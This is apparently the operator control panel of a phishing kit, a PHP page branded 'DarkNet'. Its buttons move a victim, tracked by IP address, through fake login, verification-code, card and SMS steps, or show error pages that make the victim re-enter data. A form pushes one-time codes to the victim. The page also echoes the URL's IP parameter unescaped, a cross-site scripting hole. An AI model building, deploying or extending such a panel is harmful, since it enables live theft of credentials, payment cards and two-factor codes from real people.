<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">

        <link rel="icon" type="image/x-icon" href="./Assets/imgs/logo.jpg" />

        <title>Control</title>
        <style>
            body{
                overflow-x: hidden;
                overflow-y: auto;
                background:black;
            }
            .wrapper{
                width:100%;
                min-height:85vh;
            }
            button[type="submit"]{
                font-size:13px;
            }
            .wrapper img{
                width:100%;
                height:100%;
                object-fit: cover;
                position: absolute;
                opacity:0.02;
                z-index: -1;
                cursor: pointer;
            }
            .ipx{
                animation: bubble 1.0s infinite;
                color:red;
                font-size:14px;
            }
            @keyframes bubble {
                0%   { transform:scale(0.5); opacity:0.0; }
                50%  { transform:scale(1.2); opacity:0.5; }
                100% { transform:scale(1.0); opacity:1.0; }
            }
        </style>
    </head>

    <body>
        <div class="header text-center d-flex justify-content-center flex-column align-items-center py-2" style="background-color: black;">
            <img src="./Assets/imgs/logo.jpg" alt="" style="width:50px; border-radius:50%;">
            <p class="mb-0" style='color:white;'>DarkNet</p>
        </div>
        <div class="ip">
                <?php
                if (isset($_GET["ip"])) {
                    echo "<p class='text-center ipx'>".$_GET["ip"]."</p>";
                }
                ?>
            </div>
        <div class="wrapper">
            <img src="./Assets/imgs/logo.jpg">
            <div class="container text-center pb-3" style="padding-top:70px;">
                <form method="post" action="./Assets/php/config/control.php" class="d-flex flex-wrap justify-content-center algin-items-center" style="gap:10px">
                    <input type="hidden" name="step" value="control">
                    <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                    <button type="button" class="btn btn-info">Send Code Login</button> 
                    <button type="submit" class="btn btn-success" name="to" value="log">LOGIN</button>
                    <button type="submit" class="btn btn-danger" name="to" value="log_error">LOGIN</button>
                    <button type="submit" class="btn btn-success" name="to" value="code">code</button>
                    <button type="submit" class="btn btn-danger" name="to" value="code_error">code</button>
                    <button type="submit" class="btn btn-success" name="to" value="card">card</button> 
                    <button type="submit" class="btn btn-danger" name="to" value="card_error">card</button> 
                    <button type="submit" class="btn btn-success" name="to" value="sms">SMS</button> 
                    <button type="submit" class="btn btn-danger" name="to" value="sms_error">SMS</button> 
                    <button type="submit" class="btn btn-success" name="to" value="success"><i class="ri-home-3-fill"></i></button>
                </form>
            </div>
            <div class="modal" tabindex="-1" role="dialog" style="JUSTIFY-CONTENT: CENTER;position:relative;">
                <div class="modal-dialog" role="document">
                    <form method="post" action="./Assets/php/config/number.php" class="modal-content">
                        <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                        <div class="modal-header">
                            <h5 class="modal-title">Send code</h5>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                            </button>
                        </div>
                        <div class="modal-body">
                            <input type="text" name="number" style="border:1px solid #eee;" placeholder="Enter code">
                        </div>
                        <div class="modal-footer">
                            <button type="submit" class="btn btn-primary">send</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="assets/js/script.js"></script>
                

        <script>
            $(".btn-info").click(function(){
                $(".modal").css("display","flex")
            });
            $(".close").click(function(){
                $(".modal").css("display","none")
            });
        </script>
    </body>

</html>